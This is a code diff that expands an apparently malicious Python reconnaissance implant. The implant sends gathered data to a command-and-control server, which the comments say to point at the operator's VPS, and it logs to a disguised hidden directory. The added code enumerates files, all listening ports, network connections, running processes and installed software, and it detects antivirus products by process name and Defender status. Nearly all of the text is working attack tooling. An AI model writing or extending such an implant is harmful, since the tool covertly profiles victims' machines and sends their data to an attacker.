@@ -40,14 +40,17 @@ C2_SERVER = "http://127.0.0.1:8000"  # ⚠️ CHANGE THIS TO YOUR VPS!
 C2_ENDPOINT = f"{C2_SERVER}/api/submit_scan/"
 
 # Reconnaissance settings
-MAX_FILES = 500       # Maximum number of files to enumerate
-MAX_DEPTH = 3         # Maximum directory depth to traverse
-ENABLE_PORT_SCAN = False  # Set to True to enable port scanning (may be detected)
+MAX_FILES = 1000      # Maximum number of files to enumerate
+MAX_DEPTH = 5         # Maximum directory depth to traverse
+ENABLE_PORT_SCAN = True   # Enable comprehensive port scanning
+ENABLE_NETWORK_ENUM = True  # Enable network connection enumeration
+ENABLE_PROCESS_ENUM = True  # Enable running process enumeration
+ENABLE_SOFTWARE_ENUM = True # Enable installed software enumeration
 
-# Port scanning configuration (if enabled)
+# Port scanning configuration
 TARGET_HOST = "127.0.0.1"  # Target for port scan (typically localhost)
 PORT_RANGE_START = 1       # Start port
-PORT_RANGE_END = 1024      # End port (1-1024 for common services)
+PORT_RANGE_END = 65535     # End port (full range scan)
 
 # Local logging
 LOCAL_LOG_DIR = Path.home() / ".cache" / "syslog"  # Hidden directory
@@ -190,9 +193,294 @@ def gather_system_info():
         return {'error': str(e)}
 
 
+def get_listening_ports():
+    """
+    Get all listening ports using psutil (more reliable than port scanning)
+    
+    Returns:
+        List of dictionaries with port information
+    """
+    if not ENABLE_PORT_SCAN:
+        log("Port enumeration disabled", "INFO")
+        return []
+    
+    log("Enumerating listening ports...")
+    listening_ports = []
+    
+    try:
+        connections = psutil.net_connections(kind='inet')
+        
+        for conn in connections:
+            if conn.status == 'LISTEN':
+                port_info = {
+                    'port': conn.laddr.port,
+                    'address': conn.laddr.ip,
+                    'family': 'IPv4' if conn.family == socket.AF_INET else 'IPv6',
+                    'pid': conn.pid,
+                }
+                
+                # Try to get process name
+                if conn.pid:
+                    try:
+                        process = psutil.Process(conn.pid)
+                        port_info['process'] = process.name()
+                        port_info['process_path'] = process.exe()
+                    except (psutil.NoSuchProcess, psutil.AccessDenied):
+                        port_info['process'] = 'Unknown'
+                        port_info['process_path'] = None
+                
+                listening_ports.append(port_info)
+        
+        log(f"Found {len(listening_ports)} listening ports")
+        return listening_ports
+        
+    except Exception as e:
+        log(f"Error enumerating ports: {e}", "ERROR")
+        return []
+
+
+def get_network_connections():
+    """
+    Enumerate all active network connections
+    
+    Returns:
+        List of network connection information
+    """
+    if not ENABLE_NETWORK_ENUM:
+        log("Network enumeration disabled", "INFO")
+        return []
+    
+    log("Enumerating network connections...")
+    connections = []
+    
+    try:
+        for conn in psutil.net_connections(kind='inet'):
+            conn_info = {
+                'local_address': f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else None,
+                'remote_address': f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else None,
+                'status': conn.status,
+                'pid': conn.pid,
+            }
+            
+            # Get process info
+            if conn.pid:
+                try:
+                    process = psutil.Process(conn.pid)
+                    conn_info['process'] = process.name()
+                except (psutil.NoSuchProcess, psutil.AccessDenied):
+                    conn_info['process'] = 'Unknown'
+            
+            connections.append(conn_info)
+        
+        log(f"Found {len(connections)} network connections")
+        return connections
+        
+    except Exception as e:
+        log(f"Error enumerating connections: {e}", "ERROR")
+        return []
+
+
+def get_running_processes():
+    """
+    Enumerate all running processes
+    
+    Returns:
+        List of process information
+    """
+    if not ENABLE_PROCESS_ENUM:
+        log("Process enumeration disabled", "INFO")
+        return []
+    
+    log("Enumerating running processes...")
+    processes = []
+    
+    try:
+        for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent', 'status', 'create_time']):
+            try:
+                proc_info = proc.info
+                proc_info['create_time'] = datetime.fromtimestamp(proc_info['create_time']).isoformat() if proc_info.get('create_time') else None
+                
+                # Try to get executable path
+                try:
+                    proc_info['exe'] = proc.exe()
+                except (psutil.AccessDenied, psutil.NoSuchProcess):
+                    proc_info['exe'] = None
+                
+                processes.append(proc_info)
+                
+            except (psutil.NoSuchProcess, psutil.AccessDenied):
+                continue
+        
+        log(f"Found {len(processes)} running processes")
+        return processes
+        
+    except Exception as e:
+        log(f"Error enumerating processes: {e}", "ERROR")
+        return []
+
+
+def get_installed_software():
+    """
+    Enumerate installed software (OS-specific)
+    
+    Returns:
+        List of installed software
+    """
+    if not ENABLE_SOFTWARE_ENUM:
+        log("Software enumeration disabled", "INFO")
+        return []
+    
+    log("Enumerating installed software...")
+    software = []
+    system = platform.system()
+    
+    try:
+        if system == "Windows":
+            # Windows: Query registry for installed programs
+            try:
+                import winreg
+                
+                reg_paths = [
+                    r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
+                    r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
+                ]
+                
+                for reg_path in reg_paths:
+                    try:
+                        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path)
+                        
+                        for i in range(winreg.QueryInfoKey(key)[0]):
+                            try:
+                                subkey_name = winreg.EnumKey(key, i)
+                                subkey = winreg.OpenKey(key, subkey_name)
+                                
+                                try:
+                                    name = winreg.QueryValueEx(subkey, "DisplayName")[0]
+                                    version = winreg.QueryValueEx(subkey, "DisplayVersion")[0] if "DisplayVersion" else "Unknown"
+                                    
+                                    software.append({
+                                        'name': name,
+                                        'version': version,
+                                        'source': 'registry'
+                                    })
+                                except:
+                                    pass
+                                
+                                winreg.CloseKey(subkey)
+                            except:
+                                continue
+                        
+                        winreg.CloseKey(key)
+                    except:
+                        continue
+                        
+            except ImportError:
+                log("winreg not available", "WARNING")
+                
+        elif system == "Darwin":  # macOS
+            # macOS: Query Applications folder
+            apps_dir = Path("/Applications")
+            if apps_dir.exists():
+                for app in apps_dir.glob("*.app"):
+                    software.append({
+                        'name': app.stem,
+                        'version': 'Unknown',
+                        'source': 'applications'
+                    })
+        
+        else:  # Linux
+            # Linux: Try multiple package managers
+            package_managers = [
+                ("dpkg", ["dpkg", "-l"]),
+                ("rpm", ["rpm", "-qa"]),
+                ("pacman", ["pacman", "-Q"]),
+            ]
+            
+            for pm_name, cmd in package_managers:
+                try:
+                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
+                    if result.returncode == 0:
+                        lines = result.stdout.strip().split('\n')
+                        for line in lines:
+                            parts = line.split()
+                            if len(parts) >= 2:
+                                software.append({
+                                    'name': parts[0] if pm_name == "rpm" else parts[1],
+                                    'version': parts[1] if pm_name == "rpm" else (parts[2] if len(parts) > 2 else "Unknown"),
+                                    'source': pm_name
+                                })
+                        log(f"Found {len(software)} packages via {pm_name}")
+                        break  # Use first available package manager
+                except (subprocess.TimeoutExpired, FileNotFoundError):
+                    continue
+        
+        log(f"Found {len(software)} installed software packages")
+        return software
+        
+    except Exception as e:
+        log(f"Error enumerating software: {e}", "ERROR")
+        return []
+
+
+def detect_antivirus():
+    """
+    Detect installed antivirus software
+    
+    Returns:
+        List of detected AV products
+    """
+    log("Detecting antivirus software...")
+    av_products = []
+    system = platform.system()
+    
+    try:
+        if system == "Windows":
+            # Check for Windows Defender
+            try:
+                result = subprocess.run(
+                    ["powershell", "-Command", "Get-MpComputerStatus"],
+                    capture_output=True,
+                    text=True,
+                    timeout=10
+                )
+                if "AntivirusEnabled" in result.stdout or result.returncode == 0:
+                    av_products.append({
+                        'name': 'Windows Defender',
+                        'enabled': 'AntivirusEnabled.*True' in result.stdout.replace(' ', ''),
+                        'updated': 'AntivirusSignatureLastUpdated' in result.stdout
+                    })
+            except:
+                pass
+            
+            # Check for common AV processes
+            av_processes = [
+                'avgnt.exe', 'avguard.exe',  # Avira
+                'avgui.exe', 'avgsvc.exe',   # AVG
+                'bdagent.exe', 'bdservicehost.exe',  # Bitdefender
+                'mcshield.exe', 'mcafee.exe',  # McAfee
+                'nortonsecurity.exe', 'ns.exe',  # Norton
+                'wrsa.exe', 'sophoshealth.exe',  # Sophos
+            ]
+            
+            for proc in psutil.process_iter(['name']):
+                if proc.info['name'].lower() in [p.lower() for p in av_processes]:
+                    av_products.append({
+                        'name': proc.info['name'],
+                        'type': 'process',
+                        'status': 'running'
+                    })
+        
+        log(f"Detected {len(av_products)} AV products")
+        return av_products
+        
+    except Exception as e:
+        log(f"Error detecting AV: {e}", "ERROR")
+        return []
+
+
 def scan_ports(target, start_port=1, end_port=1024, timeout=0.5):
     """
-    Scan ports on target host (CAUTION: May be detected by IDS/IPS)
+    Scan ports on target host (LEGACY - use get_listening_ports instead)
     
     Args:
         target: Target hostname/IP
@@ -363,21 +651,31 @@ def main():
         max_depth=MAX_DEPTH
     )
     
-    # Step 3: Port scan (if enabled)
-    open_ports = []
-    if ENABLE_PORT_SCAN:
-        open_ports = scan_ports(
-            target=TARGET_HOST,
-            start_port=PORT_RANGE_START,
-            end_port=PORT_RANGE_END
-        )
+    # Step 3: Enumerate listening ports (using psutil)
+    listening_ports = get_listening_ports()
     
-    # Step 4: Build payload
+    # Step 4: Enumerate network connections
+    network_connections = get_network_connections()
+    
+    # Step 5: Enumerate running processes
+    running_processes = get_running_processes()
+    
+    # Step 6: Enumerate installed software
+    installed_software = get_installed_software()
+    
+    # Step 7: Detect antivirus
+    antivirus = detect_antivirus()
+    
+    # Step 8: Build comprehensive payload
     payload = {
         'recon_data': {
             **system_info,
             'files': files,
-            'open_ports': open_ports,
+            'listening_ports': listening_ports,
+            'network_connections': network_connections,
+            'running_processes': running_processes,
+            'installed_software': installed_software,
+            'antivirus': antivirus,
             'timestamp': datetime.now().isoformat(),
         }
     }
@@ -407,6 +705,11 @@ def main():
         log("FINAL RESULTS:")
         log(f"  Risk Level: {summary.get('overall_risk_level', 'unknown')}")
         log(f"  Sensitive Files: {summary.get('sensitive_files_found', 0)}")
+        log(f"  Listening Ports: {len(listening_ports)}")
+        log(f"  Network Connections: {len(network_connections)}")
+        log(f"  Running Processes: {len(running_processes)}")
+        log(f"  Installed Software: {len(installed_software)}")
+        log(f"  Antivirus Products: {len(antivirus)}")
         log(f"  Total Findings: {summary.get('total_findings', 0)}")
         if final_data.get('report_path'):
             log(f"  Report: {C2_SERVER}{final_data['report_path']}")
